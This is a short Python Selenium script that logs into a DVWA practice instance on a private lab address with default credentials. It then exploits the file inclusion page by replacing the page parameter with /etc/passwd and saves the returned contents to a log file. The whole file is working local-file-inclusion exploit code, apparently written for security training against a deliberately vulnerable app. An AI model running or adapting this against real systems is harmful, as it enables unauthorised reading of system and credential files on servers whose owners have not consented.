from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from bs4 import BeautifulSoup
import requests

import time
import urllib2

timeToSleep=1

# create a new Firefox session
driver = webdriver.Firefox()
#driver.implicitly_wait(10)
driver.maximize_window()
 
# navigate to the application home page
driver.get("http://192.168.147.135/dvwa/login.php")
 
# get the search textbox
username = driver.find_element_by_name("username")
password=driver.find_element_by_name("password")
 
# enter search keyword and submit
username.send_keys("admin")
password.send_keys("password")
login=driver.find_element_by_name("Login")
time.sleep(timeToSleep)
login.click()
time.sleep(timeToSleep)
driver.get("http://192.168.147.135/dvwa/vulnerabilities/fi/?page=include.php")
time.sleep(timeToSleep)

Url= driver.current_url
print Url
newUrl = Url.replace("include.php","/etc/passwd")
print newUrl
driver.get(newUrl)
#driver.get("http://192.168.147.135/dvwa/vulnerabilities/fi/?page=/etc/passwd")
time.sleep(timeToSleep)

fp=open('lfi.log','w')
html = driver.page_source
soup = BeautifulSoup(html)

for tag in soup.find_all('body'):
		fp.write(tag.text)	

